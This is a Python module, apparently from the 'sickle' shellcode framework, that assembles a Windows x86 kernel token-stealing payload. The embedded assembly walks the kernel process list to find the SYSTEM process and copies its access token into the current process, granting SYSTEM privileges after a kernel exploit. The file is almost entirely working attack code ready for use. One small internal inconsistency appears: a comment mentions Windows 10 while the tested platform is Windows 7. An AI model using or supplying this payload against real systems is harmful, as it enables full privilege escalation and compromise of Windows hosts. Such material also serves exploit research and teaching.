import sys
import math
import struct
import binascii

from sickle.common.lib.reversing.assembler import Assembler
from sickle.common.lib.generic.mparser import argument_check

class Shellcode():

    author      = "wetw0rk"
    description = "Windows (x86) Kernel Token Stealing Stub"
    example_run = f"{sys.argv[0]} -p windows/x86/kernel_token_stealer -f c"

    arguments = None

    tested_platforms = ["Windows 7"]

    def __init__(self, arg_object):


        self.arg_list = arg_object["positional arguments"]
        self.builder = Assembler('x86')

        return

    def generate_source(self):
        shellcode = """
        _start:
            pushad                            ; Save register state
            xor eax, eax                      ; set ZERO
            mov eax, fs:[eax+0x124]           ; nt!_KPCR.PcrbData.CurrentThread
            mov eax, [eax + 0x50]             ; nt!_KTHREAD.ApcState.Process
            mov ecx, eax                      ; Copy current process _EPROCESS structure
            mov edx, 0x04                     ; WIN 10 SYSTEM PROCESS PID
        SearchSystemPID:
            mov eax, [eax + 0xb8]             ; nt!_EPROCESS.ActiveProcessLinks.Flink
            sub eax, 0xb8
            cmp [eax + 0xb4], edx             ; nt!_EPROCESS.UniqueProcessId
            jne SearchSystemPID
        found:
            mov edx, [eax + 0xf8]             ; Get SYSTEM process nt!_EPROCESS.Token
            mov [ecx + 0xf8], edx             ; Replace target process nt!_EPROCESS.Token
            popad                             ; Restore registers
        """

        return shellcode

    def get_shellcode(self):
        """Generates Kernel Token Stealing Stub
        """

        return self.builder.get_bytes_from_asm(self.generate_source())

def generate():
    return Shellcode().get_shellcode()
